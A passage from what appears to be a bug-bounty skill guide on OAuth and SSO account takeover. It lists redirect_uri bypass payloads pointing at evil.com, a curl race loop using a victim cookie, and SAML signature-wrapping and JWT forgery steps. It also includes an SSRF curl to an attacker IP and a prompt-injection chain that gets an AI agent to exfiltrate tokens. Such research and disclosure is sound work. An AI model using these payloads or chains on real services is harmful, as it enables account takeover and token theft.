| prefix `https://acme.example/` (normalizes `..`) | `https://acme.example/../../@evil.com/cb` | passes raw | acme.example | usually **NO** |

**Operational rule:** headless-test (Playwright/Puppeteer) the final navigation before writing the finding as an ATO chain. Server-side accept + browser-side stay-on-legitimate-host = **not** ATO.

### Open-Redirect Bridge Payloads (when exact-match is enforced)

```
# Generic open redirects on the whitelisted domain to use as redirect_uri
https://legit.com/logout?next=https://evil.com
https://legit.com/redirect?url=https://evil.com
https://legit.com/~attacker/                       # profile page with external redirect (Gratipay #140432)
https://legit.com/oauth/authorize?scope=INVALID&redirect_uri=https://evil.com   # error-path redirect (#55525, #972601)
https://cards.twitter.com/cards/<id>/yyms%2523     # legit subdomain open redirect + fragment (#131202)
//evil.com                                          # protocol-relative redirect (#9460)
```

### Forced-Authorization / Race Payloads

```
# Forced OAuth via button ID in hash (LinkedIn #2649615)
https://target.com/oauth/authorize#authorize_button
# Hold Space / double-click the authorize overlay (WakaTime #3287060)

# Race: initiate multiple authorizations to mint multiple valid sessions (Razer #699112)
parallel: for i in {1..10}; do curl -X POST /oauth/authorize -b "sid=$VICTIM" & done

# Race in coin/purchase verification behind OAuth API (Reddit #801743, #1213765)
POST /api/v2/gold/android/verify_purchase?raw_json=1 ... transaction_id=<reused>
```

### Detection Oracles — how to tell if it worked

| Observation | Interpretation | Next step |
|---|---|---|
| `Location: ...?code=...&state=...` on attacker host | Code delivered — need exchange | POST to `/oauth/token` with client_id/secret |
| `Location: ...#access_token=...` (fragment) | Implicit delivery | Read `window.location.hash` in attacker page |
| Callback page fires request to your host with full URL in `Referer` | Referer leak | Parse token from logged `Referer` header |
| `postMessage` arrives with `e.origin` ending in target | Lax origin check | Send data back to attacker origin |
| Victim session now shows attacker's linked IdP identity | Login CSRF / linking ATO | Log in as attacker to confirm |
| Token minted for app A is accepted by app B's API | Missing audience validation | Escalate to cross-client ATO |
| SAML response replay succeeds / NameID changed to admin | Assertion trust flaw | Mint OAuth token as admin downstream |

**Negative controls matter:** run the same probe with a benign `redirect_uri`, a random `state`, and a different client_id. If the "vulnerable" behavior also happens for the control, you are observing normal flow, not a bug.

---

## Common Root Causes

1. **Weak `redirect_uri` validation** — prefix/substring matching, whitelisting an entire domain rather than exact URI, or validating the raw string before downstream normalization. A sub-path open redirect then becomes a token-theft primitive (Semrush #861940, Bohemia #405100, pixiv #1861974, Slack #2575).

2. **Missing or unbound `state`** — tutorials omit CSRF protection or validate state client-side only. Login CSRF, forced authorization, and account-linking ATO follow (#2228, #215381, #159507, #2649615).

3. **Authentication step ordering not enforced server-side** — multi-step signup→verify→grant flows trust the client to have completed earlier steps. The token endpoint accepts unverified emails (#922456, #1212374, #1074047, #2676025).

4. **Token/code in URL with outbound subrequests on the callback page** — analytics, language switchers, social share, CDN images, and third-party imports carry the full URL in `Referer` or postMessage (#482743, #140432, #787160, #265943).

5. **Mobile deep-link handlers trust all input URLs** — WebView wrappers for push-notification flows don't validate the host; custom schemes have no central registry; secrets are embedded in the app (#1700734, #5314, #110293).

6. **Secrets in client-side code and public repos** — `client_secret`/JWT signing key in JS bundles, sourcemaps, APK resources, or plaintext DB; consumer key/secret recoverable by reverse engineering (#638635, #110293, #1806275, #1994324).

7. **Missing audience / `aud` / `app_id` validation** — relying parties accept a valid token from the wrong client or IdP and log the user in based on a mutable `email` claim (Pass-The-Token, nOAuth, Picsart #739321).

8. **OIDC misconfiguration** — open dynamic registration, legacy implicit grants enabled, PKCE optional, `response_type` swapping tolerated (Basecamp #3955956, Detectify Dirty Dancing, Zoom).

9. **Permissive postMessage / clickjacking** — callback pages accept messages from any `*.target.com` origin, or the authorize button can be forced/double-clickjacked (Zoom, WakaTime #3287060, #875938).

10. **SAML/SSO assertion trust** — first-Signature/first-Response selection, response replay, client-side JWT signing, and permissive `email`/`sub` claim handling on SSO bridges (#812064, #888930, #638635, #734936, #976603).

11. **Debug/error leakage adjacent to OAuth** — `show_exceptions`, reflected error parameters, unescaped template values expose internals or create XSS on the token path (#315205, #456333, #143240).

---

## Bypass Techniques

### Validator Bypasses

- **Prefix match, no anchor:** append attacker text (`xbox.dayz.comtest.com`) — Bohemia #405100.
- **Suffix match:** `slack.com.attacker.com` defeats `endsWith()` — Slack #2575.
- **Userinfo confusion:** `legit.com@evil.com` (WHATWG parses `@` before first `/` as userinfo).
- **IDN homograph:** Cyrillic `е`, `š`, accented chars map to the legitimate host in a non-normalizing validator — Semrush #861940.
- **Path traversal:** server normalizes `../` after validation — pixiv #1861974.
- **Parameter pollution:** validator checks first `redirect_uri`, app uses last — #131202.
- **Double encoding:** `%2523` → `%23` → `#` to smuggle a fragment token — #131202.
- **Invalid-scope / error redirects:** force the authorize endpoint to redirect to an arbitrary `redirect_uri` on error — Shopify #55525, pixiv #972601.
- **POST-based open redirect:** some OAuth redirects fire on POST, bypassing GET-only filters — Moneybird #1129761.

### CSRF / state Bypasses

- **Format-only validation:** state checked for length/charset but not session binding → fixed state works.
- **Suffix extension bypass:** `/authorization.json` / `.xml` skips authenticity-token checks — Basecamp #850022.
- **Cross-Site Flashing:** permissive `crossdomain.xml` (`allow-access-from domain="*"`) lets any domain read OAuth data via Flash — Vimeo #136582.
- **Login CSRF:** drop the token before exchange and feed the victim your `code`/`oauth_verifier` — #2228.

### Token-Leakage Bypasses

- **Fragment isn't sent in Referer, but JS reads it:** `window.location.hash` → analytics/postMessage — Zoom, Detectify Dirty Dancing.
- **postMessage origin checks:** `endsWith('target.com')` accepts `eviltarget.com` or any subdomain — #875938, Zoom.
- **Image/SVG import:** `import from site` or SVG-with-script reads the hash fragment server- or client-side — #265943.
- **Short-lived codes:** a fast receiver still wins the race for Referer/redirect leaks; victim-driven CSRF flows are timing-insensitive.

### Implicit Grant & Registration Bypasses

- **response_type downgrade:** server validates only `code` but honors `token`/`id_token token` — #665651.
- **PKCE not enforced:** omit `code_challenge`; if tokens still issue, PKCE is a suggestion.
- **Legacy `type=user_agent`:** victim-bound token delivered directly to a registered redirect in the fragment — Basecamp #3955956.
- **Open dynamic registration:** register your own client with attacker `redirect_uris`.
- **prompt=none silent re-auth:** yield a token without user interaction on an existing session.

### SSO / Assertion Bypasses

- **SAML response replay:** resubmit a captured signed response within its validity window — #888930.
- **XSW1:** inject a secondary assertion with admin `NameID`; SP uses first element, signature verifies the relocated legit one — Rocket.Chat #812064.
- **Signature stripping:** remove `<ds:Signature>` entirely; naive SPs accept — #812064 class.
- **Client-side JWT forgery:** sign your own Zendesk SSO JWT using a leaked `REACT_APP_ZENDESK_SECRET` — #638635.
- **Mutable email claim:** set the IdP `mail` attribute to the victim's address (nOAuth).
- **http (cleartext) OAuth:** intercept and phish IdP credentials — Bumble #703759, #168538.

### When the Direct Path Is Blocked

- Find an open redirect on the allowlisted domain first, then chain.
- Use a dangling/claimable `*.target.com` subdomain that passes the whitelist (#110293, #131202).
- Switch binding identity: email vs `sub` vs `subject` — cross-IdP collision.

---

## Gate 0 Validation

Before writing the report, answer all three:

**1. What can the attacker DO right now?**
Be specific and complete the chain: "I send the victim a crafted authorize URL → victim clicks while logged in → the `code` is delivered to my redirect_uri → I POST it to `/oauth/token` with the captured client_id → I receive a valid access token → I am authenticated as the victim." If you can only show an open redirect that leaks `state` (no token/code, no successful exchange), this is **Low/informational**, not Critical. The exchange-the-code step is non-negotiable (see #665651, #405100, #1861974 where the token actually lands).

**2. What does the victim LOSE?**
Minimum bar: the authenticated session. Higher bars: linked accounts, payment methods, private data, internal tickets (#734936), admin scope (SAML XSW), or cross-tenant access. Quantify blast radius — a single-user ATO on a consumer app vs. a cross-IdP flaw hitting ~1B accounts (Pass-The-Token) are different severities.

**3. Can it be reproduced in 10 minutes from scratch?**
Fresh browser/device, no prior state. Walk from "unauthenticated" to "authenticated as victim" in 10 minutes with only your written steps. Document dependencies: victim must be logged in, must click a link, must have an existing account, timing/race windows. If it requires privileged network position or lucky timing, say so explicitly.

**Never-submit / downgrade list:**
- "The callback redirects to an arbitrary domain" but the URL contains only `state`/`error` — no credential.
- A `redirect_uri` bypass where the browser stays on the legitimate host (see browser-vs-server table).
- Client-side JWT signing with a secret that is not actually exposed.
- A SAML modification that changes only non-security-relevant attributes (display name, locale) without altering `NameID`, `AuthnContext`, or role-bearing attributes.
- Blind SSRF in an OAuth controller with no callback proof and no data returned (#398799 needed a live listener on the attacker IP).

---

## Real Impact Examples

### Scenario A: Email-Verification Bypass → Social OAuth ATO (GitLab / Reddit / Bumble pattern)

An attacker registers a new account on the target using an email they do not control (the victim's). The target requires a validated email before completing an OAuth grant, but the check is enforced only in the UI, not at the token endpoint. In a second browser, the attacker links the same email at the IdP. Completing "Sign in with Google/GitLab" on the unverified account causes the target to assume the email is validated and log the attacker in as the victim's linked identity. Result: full account takeover on a multi-tenant platform; at GitLab scale this reaches private repositories and CI/CD (#922456 $3,000; #1212374; #1074047; #2676025).

### Scenario B: redirect_uri Prefix-Match → Token Exfiltration (Bohemia / Semrush / pixiv pattern)

The OAuth server whitelists `redirect_uri` by prefix (`startsWith`) without an end anchor or Unicode normalization. The attacker sets `redirect_uri=https://xbox.dayz.comtest.com/cb` (Bohemia #405100) or `oauth.šemrush.com` (Semrush #861940). The validator passes; the victim is redirected to the attacker's host with `code` and `state` in the query. The attacker exchanges the code at `/oauth/token` and obtains a live access token. Result: cross-platform account takeover and data access.

### Scenario C: Referer Leakage from a Callback Page (Rockstar Games pattern)

The OAuth callback lands the user on a page with the Facebook `access_token` in the URL. The page (or a page the victim subsequently visits, such as a support thread or crew page) loads attacker-controlled `<img src>` content. The browser sends the full page URL as `Referer` to the attacker's image server, which logs the token. The attacker replays the token against Facebook `/me` and any RP accepting it. Result: cross-platform ATO, privacy/GDPR liability, and regulatory exposure (#482743, #787160, #342709, #488269, #798121).

### Scenario D: Client-Side JWT SSO Forgery → Internal Ticket Theft (Trint/Zendesk pattern)

An SPA generates the Zendesk SSO JWT in JavaScript using a signing secret embedded in the shipped bundle/sourcemap (`REACT_APP_ZENDESK_SECRET`). The attacker extracts the secret, registers an unverified account with an `*@trint.com` email, signs a JWT asserting that identity, and calls `/access/jwt?jwt=...`. Result: authentication into the internal Zendesk instance as a company user, with access to private support tickets (#638635, #734936).

### Scenario E: Implicit Grant / Registration Abuse → Victim-Bound Token Delivery (Basecamp pattern)

An OAuth AS lets any authenticated user register a client with an arbitrary `redirect_uri` (no ownership proof, no approval, no scheme validation) and still enables the deprecated `type=user_agent` implicit grant. The attacker registers a client whose redirect is their own server, induces the victim to authorize, and receives the victim-bound `access_token` directly in the fragment — no client_secret, no code exchange. Result: full confidentiality/integrity/availability compromise of the victim's account (#3955956; related: #665651, #131202).

### Scenario F: "Dirty Dancing" response_type Swap + postMessage (Zoom / Detectify pattern)

The OAuth server validates `response_type=code` but tolerates a swap to `token` (or `web_message` response mode). The attacker opens the authorize URL in a popup and registers a `message` listener whose origin check is only `endsWith('target.com')`. The callback returns the code/token via `postMessage`, the attacker's page receives it because the permissive origin check passes, and it is exchanged for a victim session. On Zoom this chained to camera/microphone hijacking ($15,000). No XSS is required — only the response-type quirk plus a promiscuous listener (#875938; Detectify multi-vendor writeup).

### Scenario G: Blind SSRF Inside an OAuth Controller (GitLab pattern)

The `Oauth::Jira::AuthorizationsController#access_token` endpoint builds an outbound request from the attacker-controlled `Host` header. Sending `curl -X POST -H 'Host: 162.243.147.21:81' https://gitlab.com/-/jira/login/oauth/access_token` causes the GitLab instance to POST to the attacker's listener on port 81 — arbitrary internal/external destinations reachable from inside the network. Confirmed with an OOB listener before reporting; $4,000 (#398799). The broader lesson: OAuth token controllers that fetch remote metadata, JWKS, or proxy endpoints are an SSRF surface — treat every outbound request driven by a request header or parameter as a blind-SSRF candidate.

### Scenario H: Debug Exception Leaks OAuth Redirect Config (Greenhouse pattern)

Supplying an invalid `oauth_redirect_uri` cookie to `/integrations/oauth/create?state=x&code=x` triggers an unhandled exception on a Sinatra app with `show_exceptions` enabled. The error page dumps internal configuration, environment variables, and source snippets, revealing how the OAuth redirect is validated. This is an information-disclosure finding on the OAuth path that materially accelerates a redirect_uri bypass (#315205). Same family: reflected `error`/`error_hint` params on `/oauth2/fallbacks/error` (#456333) and unescaped `authorize_url` injected into a template (#143240).

---

## Disclosed Report Citations (30 verified, real IDs)

All IDs below are real and appear in the study pack or `TOPOAUTH.md`. Format: Company — title (H1 link) — subclass, technique, year/bounty.

1. **Shopify — Email Confirmation Bypass in myshop.myshopify.com leading to full privilege escalation to any shop owner via SSO** ([H1 #791775](https://hackerone.com/reports/791775)) — email-confirmation bypass → SSO lateral account takeover, arbitrary email confirmation, 2020/Critical.
2. **GitLab — Ability to bypass email verification for OAuth grants results in account takeovers on 3rd parties** ([H1 #922456](https://hackerone.com/reports/922456)) — verification-bypass ATO, alternate path/channel, 2020/$3,000.
3. **Semrush — OAuth redirect_uri bypass using IDN homograph attack resulting in access token leakage** ([H1 #861940](https://hackerone.com/reports/861940)) — redirect_uri bypass, Unicode-confusable/punycode host, 2020/Medium (CVSS 6.4).
4. **X / xAI (Periscope) — Insufficient OAuth callback validation leading to Periscope account takeover** ([H1 #110293](https://hackerone.com/reports/110293)) — callback-locking bypass, leaked consumer key/secret + embedded creds, 2016.
5. **X / xAI (Periscope) — CSRF on Periscope Web OAuth authorization endpoint** ([H1 #215381](https://hackerone.com/reports/215381)) — OAuth authorization CSRF, no CSRF token/Origin validation, 2017.
6. **Phabricator — Login CSRF using Twitter OAuth** ([H1 #2228](https://hackerone.com/reports/2228)) — login CSRF, no state maintained, attacker code/verifier replay, 2014.
7. **GitLab — Unauthenticated blind SSRF in OAuth Jira authorization controller** ([H1 #398799](https://hackerone.com/reports/398799)) — OAuth-controller SSRF via attacker-controlled Host header, 2018/$4,000.
8. **Bumble — Misconfigured OAuth leads to pre-account takeover** ([H1 #1074047](https://hackerone.com/reports/1074047)) — social-login misconfiguration, weak email verification on account linking, 2021/Low.
9. **Reddit — OAuth Misconfiguration Lead To Account Takeover** ([H1 #1212374](https://hackerone.com/reports/1212374)) — verification-bypass ATO, re-login with same Gmail, 2021/Medium (CVSS 6.8).
10. **GSA Bounty — Stealing Users OAuth Tokens through redirect_uri parameter** ([H1 #665651](https://hackerone.com/reports/665651)) — redirect_uri open redirect, `response_type=token` fragment delivery, 2019/$750.
11. **Bohemia Interactive — Stealing Users OAuth Tokens via redirect_uri** ([H1 #405100](https://hackerone.com/reports/405100)) — redirect_uri prefix-match bypass (`xbox.dayz.comtest.com`), 2018/Medium.
12. **pixiv — Stealing Users OAuth authorization code via redirect_uri** ([H1 #1861974](https://hackerone.com/reports/1861974)) — path-traversal redirect_uri bypass, code leakage, 2023/$2,000.
13. **Slack — Circumvent redirect_uri restrictions using domain-suffix/subdomain technique** ([H1 #2575](https://hackerone.com/reports/2575)) — suffix-match validator bypass, foundational case, 2013.
14. **Lichess — Open Redirect Vulnerability in OAuth Flow Leading to Potential Phishing** ([H1 #3099816](https://hackerone.com/reports/3099816)) — redirect_uri open redirect on `lichess4545.com`, 2025/Low (CVSS 3.6).
15. **Mattermost — Server OAuth Flow Cross-Site Scripting** ([H1 #1216203](https://hackerone.com/reports/1216203)) — reflected XSS via unsanitized `redirect_to` in OAuth flow, 2021/$900.
16. **X / xAI — XSS on OAuth authorize/authenticate endpoint** ([H1 #87040](https://hackerone.com/reports/87040)) — reflected XSS via unsanitized `oauth_callback`, 2015.
17. **Basecamp — CSRF on launchpad.37signals.com OAuth2 authorization endpoint** ([H1 #850022](https://hackerone.com/reports/850022)) — authorize-endpoint CSRF, `.json`/`.xml` authenticity-token bypass, 2020/High (CVSS 8.1).
18. **Vimeo — OAuth 2 Authorization Bypass via CSRF and Cross Site Flashing** ([H1 #136582](https://hackerone.com/reports/136582)) — CSRF + permissive `crossdomain.xml`, 2016.
19. **X / xAI — [Critical] Steal OAuth Tokens** ([H1 #131202](https://hackerone.com/reports/131202)) — wildcard redirect_uri + open redirect + double-encoding (`%2523`) → Microsoft token theft, 2016/$840.
20. **Gratipay — Configure a redirect URI for Facebook OAuth** ([H1 #140432](https://hackerone.com/reports/140432)) — Referer leakage via profile redirect path, 2016/$10.
21. **Rockstar Games — Facebook OAuth Code Theft through referer leakage on support.rockstargames.com** ([H1 #482743](https://hackerone.com/reports/482743)) — Referer leakage via injected `<img src>`, 2020.
22. **Rockstar Games — Referer Leakage in socialclub.rockstargames.com/crew/ leading to FB OAuth token theft** ([H1 #787160](https://hackerone.com/reports/787160)) — Referer leakage, cross-platform token theft, 2020.
23. **Uber — Chained Bugs to Leak Victim's Uber Facebook OAuth Token** ([H1 #202781](https://hackerone.com/reports/202781)) — chained redirect/token leakage ATO, 424 upvotes, 2016.
24. **Shopify — Shop App: attacker intercepts authorization code during OAuth authentication (Microsoft Outlook)** ([H1 #1700734](https://hackerone.com/reports/1700734)) — mobile deep-link OAuth code interception, 2022/$900.
25. **Coinbase — Android Bitcoin Wallet leaks OAuth response code** ([H1 #5314](https://hackerone.com/reports/5314)) — mobile log leakage via `adb logcat`, code + client secret → token, 2014.
26. **X / xAI — Leaking Digits OAuth authorization to third party websites** ([H1 #166942](https://hackerone.com/reports/166942)) — weak callback_url (any subdomain/path), Referer leakage to third parties, 2016.
27. **HackerOne — SAML Response Reuse on hackerone.com/users/saml/auth** ([H1 #888930](https://hackerone.com/reports/888930)) — SAML assertion replay, 2020/Low.
28. **Rocket.Chat — SAML authentication bypass** ([H1 #812064](https://hackerone.com/reports/812064)) — XSW/signature confusion (first Signature, first Response element used), admin ATO, 2020/Critical (CVSS 8.8).
29. **Trint Ltd — Insecure Zendesk SSO implementation by generating JWT client-side** ([H1 #638635](https://hackerone.com/reports/638635)) — client-side JWT forgery via leaked signing secret in JS/sourcemap, 2019/High (CVSS 8.1).
30. **curl — Connection Reuse Ignores OAuth Bearer Token Mismatch** ([H1 #3595753](https://hackerone.com/reports/3595753)) — OAuth bearer token mismatch in shared libcurl connection pool, multi-tenant token confusion, 2026/Medium.

---

## Related Skills & Chains

- **`hunt-subdomain`** — The highest-impact OAuth chain. Chain primitive: redirect_uri validator accepts any `*.target.com` + recon reveals a dangling/claimable subdomain → claim it → host a callback receiver → craft `/oauth/authorize?redirect_uri=https://claimed.target.com/cb` → victim clicks → code lands on attacker-controlled "legitimate" host → exchange for token → ATO. Wildcard trust is explicit in #110293/#131202.

- **`hunt-ato`** — OAuth state-CSRF and verification-bypass are textbook ATO primitives. Chain primitive: missing/unbound `state` + victim logged in + attacker captures code → force victim callback → victim's session linked to attacker's IdP identity → attacker logs in via that IdP (#2228, #922456, #1212374).

- **`hunt-saml`** — When OAuth is layered over a SAML IdP, assertion-level bugs become token-level ATO. Chain primitive: XSW alters `NameID` to admin → SP mints OAuth token bearing admin identity → OAuth-scoped admin/billing APIs grant access. Replay (#888930) and first-element signature confusion (#812064) are the SAML-side mechanics.

- **`hunt-ssrf`** — OAuth controllers that fetch URLs or trust the Host header are an SSRF entry. Chain primitive: blind SSRF via `Host` on `/-/jira/login/oauth/access_token` (#398799) → internal service reach → use OOB Collaborator to confirm before claiming.

- **`hunt-auth-bypass`** — Email-verification and multi-step sequence bypasses are authorization-boundary failures. Chain primitive: direct token-endpoint POST with unverified creds → fully scoped token that passes downstream checks (#922456, #2676025).

- **`hunt-xss` / `hunt-open-redirect`** — Reflective XSS on OAuth error endpoints (#456333, #143240, #87040) and open redirects on whitelisted hosts (#55525, #972601, #1129761) are the bridge gadgets that turn a redirect_uri pass into token delivery.

- **`hunt-llm-ai`** — Agentic OAuth (MCP servers, AI plugins) reuses OAuth 2.1 + PKCE. Chain primitive: indirect prompt-injection supplies an attacker `redirect_uri` → agent crafts authorize URL → user approves → tokens exfiltrated via tool-use.

- **`security-arsenal`** — Pull the OAuth `redirect_uri` Bypass Table (host confusion, subdomain extension, path traversal, parameter pollution, encoded slashes, IDN homograph) and the browser-vs-server WHATWG parsing rule before testing filters; never claim ATO until the browser actually navigates to the attacker host.

- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an "open redirect" that leaks only `state` or on a `redirect_uri` bypass where the browser stays on the legitimate host. State-only leakage is Low; token/code leakage with a demonstrated exchange is Critical. The exchange-the-code step is non-negotiable.
